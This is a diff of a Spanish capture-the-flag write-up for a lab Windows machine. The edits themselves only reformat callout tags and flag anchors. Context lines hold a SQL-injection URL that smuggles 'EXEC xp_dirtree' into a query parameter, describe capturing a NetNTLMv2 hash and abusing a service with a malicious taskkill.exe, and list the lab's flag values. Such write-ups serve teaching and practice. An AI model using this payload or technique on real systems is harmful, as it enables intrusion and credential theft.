@@ -94,7 +94,7 @@ https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=19%20EXEC%20xp_dirtre
 
 Inmediatamente, recibí la conexión en mi listener de Impacket y capturé el hash NetNTLMv2 de un usuario llamado **Stacy**.
 
-> [!INFO] Captura de Hash
+> [!info] Captura de Hash
 > 
 > El hash capturado pertenecía a GIDDY\Stacy. El siguiente paso era intentar romper este hash para obtener la contraseña en texto plano.
 
@@ -118,7 +118,7 @@ $host.runspace.languagemode
 
 La salida fue `ConstrainedLanguage`. Esto indicaba que **AppLocker** estaba activo, restringiendo severamente los comandos y objetos de .NET que podía utilizar. Intentos de usar WMI o enumerar servicios fallaron.
 
-> [!WARNING] PowerShell en Modo Restringido
+> [!warning] PowerShell en Modo Restringido
 > 
 > El modo ConstrainedLanguage es una medida de seguridad potente que limita a un atacante a un conjunto muy básico de cmdlets, impidiendo la ejecución de scripts complejos o el acceso a APIs de Win32, lo que dificulta enormemente la enumeración y el movimiento lateral.
 
@@ -219,10 +219,10 @@ Tras unos segundos, el servicio intentó ejecutar mi `taskkill.exe` malicioso, y
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
+> [!flag] `flag{user}`
 > a9ca42ee6acfa31676711268856a10b8
-^bandera
+^bandera-user
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 > 1c075db9fa4c224d7051bc9beb4b9f51
-^bandera
+^bandera-root
